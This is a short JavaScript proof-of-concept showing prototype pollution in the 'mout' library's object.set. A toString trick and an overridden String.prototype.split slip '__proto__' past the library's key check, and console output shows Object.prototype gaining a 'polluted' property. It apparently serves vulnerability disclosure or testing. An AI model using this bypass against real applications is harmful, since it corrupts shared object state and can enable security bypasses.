var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var mout = require('mout');
var obj = {};
console.log({}.polluted);
mout.object.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);